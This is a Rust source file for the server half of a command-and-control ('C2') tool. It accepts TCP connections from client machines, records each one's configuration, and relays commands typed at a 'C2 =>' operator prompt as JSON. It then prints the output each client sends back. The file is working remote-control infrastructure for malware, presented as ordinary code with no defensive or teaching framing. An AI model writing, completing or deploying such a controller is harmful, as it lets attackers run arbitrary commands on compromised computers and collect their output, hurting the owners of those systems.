use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::error::Error;

use crate::config::{ClientConfig, ClientDetails, ClientManager, ClientCommand};
use crate::handler::command::commands;

fn send_command(mut stream: &TcpStream, cmd: &String) -> io::Result<()> {
   let client_command = ClientCommand::new(cmd);

   let serialized_command = ClientCommand::to_json(&client_command).expect(
       "Failed to serialize command") + "\n";

    stream.write_all(serialized_command.as_bytes())?;
    stream.flush()?;

    Ok(())
}

fn command_output(reader: &mut BufReader<&TcpStream>)
    -> Result<ClientCommand, Box<dyn Error>> {

    let mut buffer = Vec::new();
    match reader.read_until(b'\n', &mut buffer) {
        Ok(_) => {
            match serde_json::from_slice::<ClientCommand>(&buffer) {
                Ok(command_with_output) => Ok(command_with_output),
                Err(e) => {
                    println!("[E] Failed to deserialize command output: {}", e);
                    Err(Box::new(e))
                },
            }
        },
        Err(e) => {
            println!("[E] Failed to read from stream: {}", e);
            Err(Box::new(e))
        }
    }
}

pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut buffer = Vec::new();
    let mut reader = BufReader::new(&stream);

    // Initial configuration reception
    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {
        match serde_json::from_slice::<ClientConfig>(&buffer) {
            Ok(config) => {
                client_manager.add_client(ip.clone(), ClientDetails {
                    config,
                    command: None,
                });
            },
            Err(e) => println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e),
        }
    }

    // Waits for commands
    loop {
        buffer.clear();
        let cmd: Option<String> = client_manager.get_command(&ip);
        if cmd != None {
            let cmd = cmd.unwrap();
            println!("[I] Sending '{}' command to {}", cmd, ip);
            send_command(&stream, &cmd).unwrap();

            println!("[I] Wainting for the output of the command command '{}' \
                     sent to {}", cmd, ip);

            let command: ClientCommand = command_output(&mut reader).unwrap();
            println!("Command {} output:\n{}", cmd, command.output.unwrap());

            client_manager.reset_command(&ip).unwrap();
        }
    }
}

pub fn server(server_client_manager: ClientManager) {
    let mut cmd = String::new();

    loop {
        println!("C2 => ");
        io::stdout().flush().unwrap();

        cmd.clear();
        io::stdin().read_line(&mut cmd).expect("Failed to read command");
        cmd = cmd.trim_end().to_owned();

        commands(&cmd, &server_client_manager);
    }
}

